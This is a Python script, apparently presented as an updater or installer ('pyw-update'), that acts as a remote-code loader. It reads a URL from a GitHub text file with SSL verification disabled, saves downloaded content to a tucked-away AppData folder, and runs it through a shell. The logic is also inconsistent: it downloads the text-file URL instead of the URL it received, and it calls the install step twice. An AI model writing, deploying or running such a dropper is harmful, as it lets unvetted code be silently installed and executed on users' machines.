import os
import urllib.request
import ssl
import subprocess
import pathlib as pl

class Waiter:
    TXT_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/do_something.txt"
    APP_URL = ""
    APP_NAME = "main"
    FILE_NAME = "main.py"
    BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
    APP_DIR = os.path.join(BASE_DIR, APP_NAME)
    APP_PATH = os.path.join(APP_DIR, FILE_NAME)

    def __init__(self):
        pass
    
    def request_url(self) -> bool:
        self.APP_URL = self.get_txt_details()
        print(f"Received URL: {self.APP_URL}")
        if self.APP_URL.startswith("http"):
            self.download_and_install()
            return True
        else:
            return False

    def get_txt_details(self) -> str:
        try:
            print("Reading txt file from GitHub...")
            context = ssl._create_unverified_context()
            req = urllib.request.Request(self.TXT_URL)
            req.add_header("Pragma", "no-cache")
            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                if getattr(resp, "status", 200) != 200:
                    print(f"Failed to read txt file – Status: {getattr(resp,'status', 'unknown')}")
                    exit(1)
                content = resp.read().decode("utf-8")
                return content
        except Exception as e:
            print(f"Error reading txt file: {e}")
            exit(1)


    def download_and_install(self):
        os.makedirs(self.APP_DIR, exist_ok=True)
        try:
            print(f"→ Downloading...")
            context = ssl._create_unverified_context()
            req = urllib.request.Request(self.TXT_URL)
            req.add_header("Pragma", "no-cache")
            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                if getattr(resp, "status", 200) != 200:
                    print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
                    exit(1)
                new_content = resp.read()

            with open(self.APP_PATH, "wb") as f:
                f.write(new_content)

            print(f"→ Successfully downloaded/updated")
            subprocess.Popen([self.APP_PATH], shell=True)

        except Exception as e:
            print(f"{e}")

if __name__ == "__main__":
    self = Waiter()
    if self.request_url():
        self.download_and_install()